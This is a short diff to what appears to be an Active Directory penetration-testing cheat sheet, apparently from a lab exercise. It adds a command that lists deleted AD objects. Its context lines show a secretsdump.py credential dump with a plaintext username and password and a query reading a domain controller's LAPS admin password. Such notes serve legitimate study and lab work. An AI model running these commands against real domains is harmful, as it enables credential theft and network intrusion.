@@ -263,4 +263,6 @@ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 ```
 *LAPS-Reader*
 Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+*Ad Recycle Bin*
+Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
 ```
